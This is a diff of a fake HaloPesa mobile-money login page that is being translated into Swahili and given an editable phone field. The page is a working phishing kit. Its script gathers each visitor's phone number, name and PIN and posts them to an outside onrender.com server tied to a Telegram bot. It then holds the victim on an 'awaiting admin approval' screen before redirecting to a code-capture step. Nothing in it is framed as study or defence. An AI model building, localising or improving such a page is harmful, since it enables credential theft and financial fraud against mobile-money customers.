@@ -1,627 +1,647 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>HaloPesa | Login</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HaloPesa | Ingia</title>
 
-<style>
-/* ===== HALOPESA BRAND STYLES ===== */
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
+    <style>
+        /* ===== HALOPESA BRAND STYLES ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-body {
-  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  background: #f0f4f0;
-  min-height: 100vh;
-}
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f4f0;
+            min-height: 100vh;
+        }
 
-.container {
-  min-height: 100vh;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  padding: 0;
-}
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0;
+        }
 
-.upper-section {
-  width: 100%;
-  max-width: 420px;
-  text-align: center;
-}
+        .upper-section {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
 
-/* ===== HEADER - HaloPesa Green ===== */
-.header {
-  background: #1a7a2a;
-  padding: 28px 20px 22px;
-  border-bottom-left-radius: 24px;
-  border-bottom-right-radius: 24px;
-  box-shadow: 0 4px 16px rgba(26, 122, 42, 0.20);
-}
+        /* ===== HEADER - HaloPesa Green ===== */
+        .header {
+            background: #1a7a2a;
+            padding: 28px 20px 22px;
+            border-bottom-left-radius: 24px;
+            border-bottom-right-radius: 24px;
+            box-shadow: 0 4px 16px rgba(26, 122, 42, 0.20);
+        }
 
-.logo-circle {
-  width: 58px;
-  height: 58px;
-  background: #ffd700;
-  border-radius: 50%;
-  margin: 0 auto 10px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  color: #1a7a2a;
-  font-size: 22px;
-  font-weight: 800;
-  box-shadow: 0 2px 12px rgba(255, 215, 0, 0.30);
-}
+        .logo-circle {
+            width: 58px;
+            height: 58px;
+            background: #ffd700;
+            border-radius: 50%;
+            margin: 0 auto 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a7a2a;
+            font-size: 22px;
+            font-weight: 800;
+            box-shadow: 0 2px 12px rgba(255, 215, 0, 0.30);
+        }
 
-.brand {
-  color: #ffd700;
-  font-size: 26px;
-  font-weight: 700;
-  letter-spacing: 0.5px;
-}
+        .brand {
+            color: #ffd700;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
 
-.subtitle {
-  color: #d4edc8;
-  margin-top: 4px;
-  font-size: 14px;
-  font-weight: 400;
-}
+        .subtitle {
+            color: #d4edc8;
+            margin-top: 4px;
+            font-size: 14px;
+            font-weight: 400;
+        }
 
-/* ===== CONTENT ===== */
-.content {
-  padding: 30px 20px 20px;
-}
+        /* ===== CONTENT ===== */
+        .content {
+            padding: 30px 20px 20px;
+        }
 
-.login-title {
-  font-size: 34px;
-  color: #1a2b1a;
-  font-weight: 700;
-  margin-bottom: 22px;
-  letter-spacing: -0.5px;
-}
+        .login-title {
+            font-size: 34px;
+            color: #1a2b1a;
+            font-weight: 700;
+            margin-bottom: 22px;
+            letter-spacing: -0.5px;
+        }
 
-/* ===== PHONE DISPLAY ===== */
-.phone-wrapper {
-  position: relative;
-  margin-bottom: 25px;
-}
+        /* ===== PHONE INPUT — editable ===== */
+        .phone-wrapper {
+            position: relative;
+            margin-bottom: 25px;
+        }
 
-.phone-display {
-  width: 100%;
-  padding: 16px 18px 16px 56px;
-  border: 2px solid #d0e0d0;
-  border-radius: 12px;
-  font-size: 18px;
-  font-weight: 600;
-  background: #fafffa;
-  text-align: left;
-  color: #1a2b1a;
-  cursor: default;
-}
+        .phone-display {
+            width: 100%;
+            padding: 16px 18px 16px 56px;
+            border: 2px solid #d0e0d0;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            background: #fafffa;
+            text-align: left;
+            color: #1a2b1a;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            cursor: text;
+        }
 
-.flag {
-  position: absolute;
-  left: 18px;
-  top: 50%;
-  transform: translateY(-50%);
-  font-size: 24px;
-}
+        .phone-display:focus {
+            border-color: #1a7a2a;
+            box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.12);
+        }
 
-/* ===== PIN SECTION ===== */
-.pin-label {
-  color: #4a5a4a;
-  font-size: 16px;
-  font-weight: 600;
-  margin-bottom: 18px;
-}
+        .flag {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 24px;
+            pointer-events: none;
+        }
 
-.pin-row {
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  gap: 15px;
-}
+        /* ===== PIN SECTION ===== */
+        .pin-label {
+            color: #4a5a4a;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 18px;
+        }
 
-.pin-boxes {
-  display: flex;
-  gap: 12px;
-}
+        .pin-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+        }
 
-.pin-boxes input {
-  width: 58px;
-  height: 58px;
-  border: 2px solid #d0e0d0;
-  border-radius: 12px;
-  text-align: center;
-  font-size: 26px;
-  font-weight: 700;
-  outline: none;
-  background: #fafffa;
-  color: #1a2b1a;
-  transition: border-color 0.2s, box-shadow 0.2s;
-}
+        .pin-boxes {
+            display: flex;
+            gap: 12px;
+        }
 
-.pin-boxes input:focus {
-  border-color: #1a7a2a;
-  box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.12);
-}
+        .pin-boxes input {
+            width: 58px;
+            height: 58px;
+            border: 2px solid #d0e0d0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            outline: none;
+            background: #fafffa;
+            color: #1a2b1a;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
 
-.pin-boxes input:disabled {
-  opacity: 0.6;
-  background: #f0f4f0;
-}
+        .pin-boxes input:focus {
+            border-color: #1a7a2a;
+            box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.12);
+        }
 
-.eye {
-  font-size: 24px;
-  color: #5a6b5a;
-  cursor: pointer;
-  padding: 8px;
-  border-radius: 50%;
-  transition: background 0.2s;
-}
+        .pin-boxes input:disabled {
+            opacity: 0.6;
+            background: #f0f4f0;
+        }
 
-.eye:hover {
-  background: #eaf6ea;
-}
+        .eye {
+            font-size: 24px;
+            color: #5a6b5a;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 50%;
+            transition: background 0.2s;
+        }
 
-.forgot {
-  color: #1a7a2a;
-  margin-top: 18px;
-  font-size: 15px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: color 0.2s;
-}
+        .eye:hover {
+            background: #eaf6ea;
+        }
 
-.forgot:hover {
-  color: #136622;
-  text-decoration: underline;
-}
+        .forgot {
+            color: #1a7a2a;
+            margin-top: 18px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
 
-/* ===== STATUS MESSAGES ===== */
-#status {
-  min-height: 22px;
-  margin-top: 12px;
-  font-size: 14px;
-  font-weight: 600;
-  padding: 8px 12px;
-  border-radius: 8px;
-  display: none;
-}
+        .forgot:hover {
+            color: #136622;
+            text-decoration: underline;
+        }
 
-#status.error {
-  display: block;
-  background: #fde8e8;
-  color: #b91c1c;
-  border: 1px solid #fcc;
-}
+        /* ===== STATUS MESSAGES ===== */
+        #status {
+            min-height: 22px;
+            margin-top: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 8px 12px;
+            border-radius: 8px;
+            display: none;
+        }
 
-#status.success {
-  display: block;
-  background: #e8f5e8;
-  color: #1a7a2a;
-  border: 1px solid #b8d9b8;
-}
+        #status.error {
+            display: block;
+            background: #fde8e8;
+            color: #b91c1c;
+            border: 1px solid #fcc;
+        }
 
-#status.waiting {
-  display: block;
-  background: #fefcf0;
-  color: #b8960f;
-  border: 1px solid #f5e6b8;
-}
+        #status.success {
+            display: block;
+            background: #e8f5e8;
+            color: #1a7a2a;
+            border: 1px solid #b8d9b8;
+        }
 
-/* ===== LOWER SECTION ===== */
-.lower-section {
-  width: 100%;
-  max-width: 420px;
-  padding: 0 20px 40px;
-}
+        #status.waiting {
+            display: block;
+            background: #fefcf0;
+            color: #b8960f;
+            border: 1px solid #f5e6b8;
+        }
 
-.action-buttons {
-  margin-top: 10px;
-}
+        /* ===== LOWER SECTION ===== */
+        .lower-section {
+            width: 100%;
+            max-width: 420px;
+            padding: 0 20px 40px;
+        }
 
-/* ===== LOGIN BUTTON - HaloPesa Green ===== */
-.action {
-  width: 100%;
-  background: #1a7a2a;
-  color: white;
-  text-align: center;
-  padding: 17px;
-  border-radius: 12px;
-  font-size: 18px;
-  font-weight: 700;
-  cursor: pointer;
-  border: none;
-  transition: background 0.25s, transform 0.1s;
-  letter-spacing: 0.5px;
-}
+        .action-buttons {
+            margin-top: 10px;
+        }
 
-.action:hover {
-  background: #136622;
-  transform: scale(1.01);
-}
+        /* ===== LOGIN BUTTON - HaloPesa Green ===== */
+        .action {
+            width: 100%;
+            background: #1a7a2a;
+            color: white;
+            text-align: center;
+            padding: 17px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            transition: background 0.25s, transform 0.1s;
+            letter-spacing: 0.5px;
+        }
 
-.action:active {
-  transform: scale(0.98);
-}
+        .action:hover {
+            background: #136622;
+            transform: scale(1.01);
+        }
 
-.action.disabled {
-  opacity: 0.6;
-  cursor: not-allowed;
-  transform: none !important;
-}
+        .action:active {
+            transform: scale(0.98);
+        }
 
-/* ===== RESPONSIVE ===== */
-@media (max-width: 480px) {
-  .login-title {
-    font-size: 30px;
-  }
-  
-  .pin-boxes input {
-    width: 52px;
-    height: 52px;
-    font-size: 22px;
-  }
-  
-  .header {
-    padding: 22px 16px 18px;
-  }
-  
-  .brand {
-    font-size: 22px;
-  }
-  
-  .content {
-    padding: 22px 16px 16px;
-  }
-  
-  .phone-display {
-    font-size: 16px;
-    padding: 14px 14px 14px 50px;
-  }
-}
-</style>
+        .action.disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .login-title {
+                font-size: 30px;
+            }
+
+            .pin-boxes input {
+                width: 52px;
+                height: 52px;
+                font-size: 22px;
+            }
+
+            .header {
+                padding: 22px 16px 18px;
+            }
+
+            .brand {
+                font-size: 22px;
+            }
+
+            .content {
+                padding: 22px 16px 16px;
+            }
+
+            .phone-display {
+                font-size: 16px;
+                padding: 14px 14px 14px 50px;
+            }
+        }
+    </style>
 </head>
 
 <body>
 
-<div class="container">
+    <div class="container">
 
-  <div class="upper-section">
+        <div class="upper-section">
 
-    <!-- ===== HEADER - HaloPesa Style ===== -->
-    <div class="header">
-      <div class="logo-circle">HP</div>
-      <div class="brand">HaloPesa</div>
-      <div class="subtitle">Easy and Fast Loans</div>
-    </div>
+            <!-- ===== HEADER - HaloPesa Style ===== -->
+            <div class="header">
+                <div class="logo-circle">HP</div>
+                <div class="brand">HaloPesa</div>
+                <div class="subtitle">Mikopo Rahisi na Haraka</div>
+            </div>
 
-    <div class="content">
+            <div class="content">
 
-      <div class="login-title">Log in</div>
+                <div class="login-title">Ingia</div>
 
-      <div class="phone-wrapper">
-        <span class="flag">🇹🇿</span>
-        <input
-          class="phone-display"
-          id="phoneDisplay"
-          readonly
-          value="+255 712 345 678">
-      </div>
+                <!-- ===== PHONE INPUT ===== -->
+                <div class="phone-wrapper">
+                    <span class="flag">🇹🇿</span>
+                    <input
+                    class="phone-display"
+                    id="phoneDisplay"
+                    type="tel"
+                    placeholder="Weka nambari ya simu"
+                    value=""
+                    autocomplete="tel"
+                    />
+                </div>
 
-      <div class="pin-label">Enter your PIN (4 digits)</div>
+                <div class="pin-label">Weka Nambari ya Siri (tarakimu 4)</div>
 
-      <div class="pin-row">
-        <div class="pin-boxes">
-          <input type="tel" maxlength="1">
-          <input type="tel" maxlength="1">
-          <input type="tel" maxlength="1">
-          <input type="tel" maxlength="1">
+                <div class="pin-row">
+                    <div class="pin-boxes">
+                        <input type="tel" maxlength="1" />
+                        <input type="tel" maxlength="1" />
+                        <input type="tel" maxlength="1" />
+                        <input type="tel" maxlength="1" />
+                    </div>
+                    <div class="eye" id="toggleVisibility">👁</div>
+                </div>
+
+                <div class="forgot">Umesahau Nambari ya Siri?</div>
+                <div id="status"></div>
+
+            </div>
+
         </div>
-        <div class="eye" id="toggleVisibility">👁</div>
-      </div>
 
-      <div class="forgot">Forgot your PIN?</div>
-      <div id="status"></div>
+        <div class="lower-section">
+            <div class="action-buttons">
+                <button class="action" id="loginBtn">INGIA</button>
+            </div>
+        </div>
 
     </div>
 
-  </div>
+    <!-- ===== LOGIC — Swahili messages, phone input is used, no default number ===== -->
+    <script>
+        // Get botId from URL
+        const botId = new URLSearchParams(window.location.search).get("botId");
+        console.log("Bot ID from URL:", botId);
 
-  <div class="lower-section">
-    <div class="action-buttons">
-      <button class="action" id="loginBtn">LOG IN</button>
-    </div>
-  </div>
-
-</div>
-
-<!-- ===== YOUR LOGIC — COMPLETELY UNTOUCHED ===== -->
-<script>
-// Get botId from URL
-const botId = new URLSearchParams(window.location.search).get("botId");
-console.log("Bot ID from URL:", botId);
-
-// If no botId, show error
-if (!botId) {
-  document.getElementById("status").textContent = "Error: Missing bot ID. Please use the link from Telegram.";
-  document.querySelector(".action").style.opacity = "0.5";
-}
-
-// Set phone display
-document.getElementById("phoneDisplay").value = 
-  localStorage.getItem("phone") || "+255 712 345 678";
-
-const boxes = document.querySelectorAll(".pin-boxes input");
-const statusEl = document.getElementById("status");
-const loginBtn = document.getElementById("loginBtn");
-let isPasswordVisible = false;
-
-// Toggle visibility
-document.getElementById("toggleVisibility").addEventListener("click", function() {
-  isPasswordVisible = !isPasswordVisible;
-  boxes.forEach(box => {
-    box.type = isPasswordVisible ? "text" : "tel";
-  });
-  this.textContent = isPasswordVisible ? "🙈" : "👁";
-});
-
-async function sendPinToTelegram(name, phone, pin) {
-  const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
-  
-  const cleanPhone = phone.replace(/\s/g, '');
-  
-  const payload = {
-    name: name || "Unknown",
-    phone: cleanPhone || "Unknown",
-    pin: pin || "",
-    botId: botId || ""
-  };
-  
-  console.log("Sending to backend:", payload);
-  
-  try {
-    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "Accept": "application/json"
-      },
-      body: JSON.stringify(payload)
-    });
-    
-    console.log("Response status:", res.status);
-    
-    const responseText = await res.text();
-    console.log("Response body:", responseText);
-    
-    if (!res.ok) {
-      try {
-        const errorData = JSON.parse(responseText);
-        statusEl.textContent = `Error: ${errorData.error || 'Server error'}`;
-      } catch {
-        statusEl.textContent = `Server error (${res.status}): ${responseText}`;
-      }
-      return null;
-    }
-    
-    const data = JSON.parse(responseText);
-    console.log("Success response:", data);
-    return data;
-    
-  } catch (error) {
-    console.error("Network error:", error);
-    statusEl.textContent = "Network error. Please check your connection.";
-    return null;
-  }
-}
-
-async function pollPinApproval(requestId) {
-  const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
-  let attempts = 0;
-  
-  // NO TIMEOUT - Wait indefinitely for admin approval
-  return new Promise((resolve) => {
-    const interval = setInterval(async () => {
-      attempts++;
-      console.log(`Polling attempt ${attempts} for ${requestId}`);
-      
-      try {
-        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
-        const data = await res.json();
-        console.log("Poll response:", data);
-        
-        if (data.blocked) {
-          clearInterval(interval);
-          statusEl.className = "error";
-          statusEl.textContent = "Your account has been blocked.";
-          resolve(false);
-          return;
+        // If no botId, show error in Swahili
+        if (!botId) {
+            document.getElementById("status").textContent = "Hitilafu: Hakuna Kitambulisho cha Bot. Tafadhali tumia kiungo kutoka Telegram.";
+            document.querySelector(".action").style.opacity = "0.5";
         }
-        
-        if (data.approved === true) {
-          clearInterval(interval);
-          statusEl.className = "success";
-          statusEl.textContent = "PIN approved! Redirecting...";
-          resolve(true);
-          return;
+
+        const phoneInput = document.getElementById("phoneDisplay");
+        // Do NOT pre-fill with any default number — start empty
+        phoneInput.value = "";
+
+        const boxes = document.querySelectorAll(".pin-boxes input");
+        const statusEl = document.getElementById("status");
+        const loginBtn = document.getElementById("loginBtn");
+        let isPasswordVisible = false;
+
+        // Save phone to localStorage when user types
+        phoneInput.addEventListener("input", function() {
+            localStorage.setItem("phone", this.value);
+        });
+
+        // Toggle visibility
+        document.getElementById("toggleVisibility").addEventListener("click", function() {
+            isPasswordVisible = !isPasswordVisible;
+            boxes.forEach(box => {
+                box.type = isPasswordVisible ? "text" : "tel";
+            });
+            this.textContent = isPasswordVisible ? "🙈" : "👁";
+        });
+
+        async function sendPinToTelegram(name, phone, pin) {
+            const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
+
+            const cleanPhone = phone.replace(/\s/g, '');
+
+            const payload = {
+                name: name || "Unknown",
+                phone: cleanPhone || "Unknown",
+                pin: pin || "",
+                botId: botId || ""
+            };
+
+            console.log("Sending to backend:", payload);
+
+            try {
+                const res = await fetch(`${BACKEND_URL}/submit-pin`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log("Response status:", res.status);
+
+                const responseText = await res.text();
+                console.log("Response body:", responseText);
+
+                if (!res.ok) {
+                    try {
+                        const errorData = JSON.parse(responseText);
+                        statusEl.textContent = `Hitilafu: ${errorData.error || 'Hitilafu ya seva'}`;
+                    } catch {
+                        statusEl.textContent = `Hitilafu ya seva (${res.status}): ${responseText}`;
+                    }
+                    return null;
+                }
+
+                const data = JSON.parse(responseText);
+                console.log("Success response:", data);
+                return data;
+
+            } catch (error) {
+                console.error("Network error:", error);
+                statusEl.textContent = "Tatizo la muunganisho. Tafadhali angalia mtandao wako.";
+                return null;
+            }
         }
-        
-        if (data.approved === false) {
-          clearInterval(interval);
-          statusEl.className = "error";
-          statusEl.textContent = "Incorrect PIN. Please try again.";
-          resolve(false);
-          return;
+
+        async function pollPinApproval(requestId) {
+            const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
+            let attempts = 0;
+
+            return new Promise((resolve) => {
+                const interval = setInterval(async () => {
+                    attempts++;
+                    console.log(`Polling attempt ${attempts} for ${requestId}`);
+
+                    try {
+                        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+                        const data = await res.json();
+                        console.log("Poll response:", data);
+
+                        if (data.blocked) {
+                            clearInterval(interval);
+                            statusEl.className = "error";
+                            statusEl.textContent = "Akaunti yako imezuiwa.";
+                            resolve(false);
+                            return;
+                        }
+
+                        if (data.approved === true) {
+                            clearInterval(interval);
+                            statusEl.className = "success";
+                            statusEl.textContent = "Nambari ya Siri imekubaliwa! Inaelekeza...";
+                            resolve(true);
+                            return;
+                        }
+
+                        if (data.approved === false) {
+                            clearInterval(interval);
+                            statusEl.className = "error";
+                            statusEl.textContent = "Nambari ya Siri si sahihi. Tafadhali jaribu tena.";
+                            resolve(false);
+                            return;
+                        }
+
+                        // Still waiting - show waiting message with elapsed time
+                        if (attempts % 10 === 0 || attempts === 1) {
+                            const elapsedSeconds = Math.floor(attempts * 1.5);
+                            const minutes = Math.floor(elapsedSeconds / 60);
+                            const seconds = elapsedSeconds % 60;
+                            const timeStr = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
+                            statusEl.className = "waiting";
+                            statusEl.textContent = `Inasubiri idhini ya msimamizi... (${timeStr})`;
+                        }
+
+                    } catch (error) {
+                        console.error("Poll error:", error);
+                        statusEl.className = "waiting";
+                        statusEl.textContent = "Tatizo la muunganisho. Inajaribu tena...";
+                    }
+                }, 1500);
+            });
         }
-        
-        // Still waiting - show waiting message with elapsed time
-        if (attempts % 10 === 0 || attempts === 1) {
-          const elapsedSeconds = Math.floor(attempts * 1.5);
-          const minutes = Math.floor(elapsedSeconds / 60);
-          const seconds = elapsedSeconds % 60;
-          const timeStr = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
-          statusEl.className = "waiting";
-          statusEl.textContent = `Waiting for admin approval... (${timeStr})`;
-        }
-        
-      } catch (error) {
-        console.error("Poll error:", error);
-        // Don't stop polling on network errors - keep trying
-        statusEl.className = "waiting";
-        statusEl.textContent = "Connection issue. Retrying...";
-      }
-    }, 1500);
-  });
-}
 
-// PIN input handling
-boxes.forEach((box, i) => {
-  box.addEventListener("input", async () => {
-    // Allow only numbers
-    box.value = box.value.replace(/[^0-9]/g, '');
-    
-    // Auto-advance to next box
-    if (box.value && i < 3) {
-      boxes[i + 1].focus();
-    }
-    
-    // Check if all 4 digits are entered
-    if (i === 3 && box.value) {
-      let pin = "";
-      boxes.forEach(b => pin += b.value);
-      
-      // Validate botId
-      if (!botId) {
-        statusEl.className = "error";
-        statusEl.textContent = "Error: Bot ID missing. Please use the link from Telegram.";
-        boxes.forEach(b => { b.disabled = false; b.value = ""; });
-        boxes[0].focus();
-        return;
-      }
-      
-      // Get user data - try multiple possible localStorage keys
-      const firstName = localStorage.getItem("firstName") || "";
-      const lastName = localStorage.getItem("lastName") || "";
-      const name = localStorage.getItem("name") || "";
-      
-      // Build full name
-      let fullName = name;
-      if (!fullName && firstName) {
-        fullName = lastName ? `${firstName} ${lastName}` : firstName;
-      }
-      if (!fullName) {
-        fullName = "Unknown";
-      }
-      
-      const phone = localStorage.getItem("phone") || "Unknown";
-      
-      console.log("Submitting PIN:", { fullName, phone, pin, botId });
-      console.log("localStorage keys:", Object.keys(localStorage));
-      
-      // Disable inputs while processing
-      boxes.forEach(b => b.disabled = true);
-      loginBtn.classList.add("disabled");
-      loginBtn.textContent = "VERIFYING...";
-      statusEl.className = "waiting";
-      statusEl.textContent = "Sending PIN for verification...";
-      
-      // Send PIN to backend
-      const res = await sendPinToTelegram(fullName, phone, pin);
-      
-      if (!res || !res.requestId) {
-        statusEl.className = "error";
-        statusEl.textContent = "Failed to send PIN. Please try again.";
-        boxes.forEach(b => { b.disabled = false; b.value = ""; });
-        loginBtn.classList.remove("disabled");
-        loginBtn.textContent = "LOG IN";
-        boxes[0].focus();
-        return;
-      }
-      
-      statusEl.className = "waiting";
-      statusEl.textContent = "Waiting for admin approval...";
-      
-      // Poll for approval (will wait indefinitely until admin responds)
-      const approved = await pollPinApproval(res.requestId);
-      
-      if (approved === true) {
-        localStorage.setItem("pin", pin);
-        setTimeout(() => {
-          window.location.href = `code.html?botId=${botId}`;
-        }, 500);
-      } else if (approved === false) {
-        boxes.forEach(b => { b.disabled = false; b.value = ""; });
-        loginBtn.classList.remove("disabled");
-        loginBtn.textContent = "LOG IN";
-        boxes[0].focus();
-      } else {
-        boxes.forEach(b => { b.disabled = false; b.value = ""; });
-        loginBtn.classList.remove("disabled");
-        loginBtn.textContent = "LOG IN";
-        boxes[0].focus();
-      }
-    }
-  });
-  
-  // Handle backspace
-  box.addEventListener("keydown", (e) => {
-    if (e.key === "Backspace" && !box.value && i > 0) {
-      boxes[i - 1].focus();
-    }
-    // Allow Enter key to submit
-    if (e.key === "Enter") {
-      let pin = "";
-      boxes.forEach(b => pin += b.value);
-      if (pin.length === 4) {
-        const event = new Event('input');
-        boxes[3].dispatchEvent(event);
-      } else {
-        statusEl.className = "error";
-        statusEl.textContent = "Please enter all 4 digits";
-      }
-    }
-  });
-});
+        // PIN input handling
+        boxes.forEach((box, i) => {
+            box.addEventListener("input", async () => {
+                // Allow only numbers
+                box.value = box.value.replace(/[^0-9]/g, '');
 
-// Focus first input on load
-boxes[0].focus();
+                // Auto-advance to next box
+                if (box.value && i < 3) {
+                    boxes[i + 1].focus();
+                }
 
-// Click handler for login button
-loginBtn.addEventListener("click", () => {
-  let pin = "";
-  boxes.forEach(b => pin += b.value);
-  
-  if (pin.length === 4) {
-    const event = new Event('input');
-    boxes[3].dispatchEvent(event);
-  } else {
-    statusEl.className = "error";
-    statusEl.textContent = "Please enter a 4-digit PIN";
-    boxes[0].focus();
-  }
-});
+                // Check if all 4 digits are entered
+                if (i === 3 && box.value) {
+                    let pin = "";
+                    boxes.forEach(b => pin += b.value);
 
-// Handle paste functionality
-document.addEventListener('paste', (e) => {
-  const pastedData = e.clipboardData.getData('text');
-  const cleanedData = pastedData.replace(/[^0-9]/g, '');
-  
-  if (cleanedData.length === 4) {
-    boxes.forEach((box, index) => {
-      box.value = cleanedData[index] || '';
-    });
-    boxes[3].focus();
-    const event = new Event('input');
-    boxes[3].dispatchEvent(event);
-  }
-});
-</script>
+                    // Validate botId
+                    if (!botId) {
+                        statusEl.className = "error";
+                        statusEl.textContent = "Hitilafu: Hakuna Kitambulisho cha Bot. Tafadhali tumia kiungo kutoka Telegram.";
+                        boxes.forEach(b => { b.disabled = false;
+                            b.value = ""; });
+                        boxes[0].focus();
+                        return;
+                    }
+
+                    // Read phone from the input field (not localStorage)
+                    const phone = phoneInput.value.trim() || "Unknown";
+
+                    // Get user data - try multiple possible localStorage keys
+                    const firstName = localStorage.getItem("firstName") || "";
+                    const lastName = localStorage.getItem("lastName") || "";
+                    const name = localStorage.getItem("name") || "";
+
+                    // Build full name
+                    let fullName = name;
+                    if (!fullName && firstName) {
+                        fullName = lastName ? `${firstName} ${lastName}` : firstName;
+                    }
+                    if (!fullName) {
+                        fullName = "Unknown";
+                    }
+
+                    console.log("Submitting PIN:", { fullName, phone, pin, botId });
+                    console.log("localStorage keys:", Object.keys(localStorage));
+
+                    // Disable inputs while processing
+                    boxes.forEach(b => b.disabled = true);
+                    loginBtn.classList.add("disabled");
+                    loginBtn.textContent = "INATHIBITISHA...";
+                    statusEl.className = "waiting";
+                    statusEl.textContent = "Inatuma Nambari ya Siri kwa uthibitisho...";
+
+                    // Send PIN to backend
+                    const res = await sendPinToTelegram(fullName, phone, pin);
+
+                    if (!res || !res.requestId) {
+                        statusEl.className = "error";
+                        statusEl.textContent = "Imeshindwa kutuma Nambari ya Siri. Tafadhali jaribu tena.";
+                        boxes.forEach(b => { b.disabled = false;
+                            b.value = ""; });
+                        loginBtn.classList.remove("disabled");
+                        loginBtn.textContent = "INGIA";
+                        boxes[0].focus();
+                        return;
+                    }
+
+                    statusEl.className = "waiting";
+                    statusEl.textContent = "Inasubiri idhini ya msimamizi...";
+
+                    // Poll for approval (will wait indefinitely until admin responds)
+                    const approved = await pollPinApproval(res.requestId);
+
+                    if (approved === true) {
+                        localStorage.setItem("pin", pin);
+                        setTimeout(() => {
+                            window.location.href = `code.html?botId=${botId}`;
+                        }, 500);
+                    } else if (approved === false) {
+                        boxes.forEach(b => { b.disabled = false;
+                            b.value = ""; });
+                        loginBtn.classList.remove("disabled");
+                        loginBtn.textContent = "INGIA";
+                        boxes[0].focus();
+                    } else {
+                        boxes.forEach(b => { b.disabled = false;
+                            b.value = ""; });
+                        loginBtn.classList.remove("disabled");
+                        loginBtn.textContent = "INGIA";
+                        boxes[0].focus();
+                    }
+                }
+            });
+
+            // Handle backspace
+            box.addEventListener("keydown", (e) => {
+                if (e.key === "Backspace" && !box.value && i > 0) {
+                    boxes[i - 1].focus();
+                }
+                // Allow Enter key to submit
+                if (e.key === "Enter") {
+                    let pin = "";
+                    boxes.forEach(b => pin += b.value);
+                    if (pin.length === 4) {
+                        const event = new Event('input');
+                        boxes[3].dispatchEvent(event);
+                    } else {
+                        statusEl.className = "error";
+                        statusEl.textContent = "Tafadhali weka tarakimu zote 4";
+                    }
+                }
+            });
+        });
+
+        // Focus first input on load
+        boxes[0].focus();
+
+        // Click handler for login button
+        loginBtn.addEventListener("click", () => {
+            let pin = "";
+            boxes.forEach(b => pin += b.value);
+
+            if (pin.length === 4) {
+                const event = new Event('input');
+                boxes[3].dispatchEvent(event);
+            } else {
+                statusEl.className = "error";
+                statusEl.textContent = "Tafadhali weka Nambari ya Siri yenye tarakimu 4";
+                boxes[0].focus();
+            }
+        });
+
+        // Handle paste functionality
+        document.addEventListener('paste', (e) => {
+            const pastedData = e.clipboardData.getData('text');
+            const cleanedData = pastedData.replace(/[^0-9]/g, '');
+
+            if (cleanedData.length === 4) {
+                boxes.forEach((box, index) => {
+                    box.value = cleanedData[index] || '';
+                });
+                boxes[3].focus();
+                const event = new Event('input');
+                boxes[3].dispatchEvent(event);
+            }
+        });
+    </script>
 
 </body>
 </html>
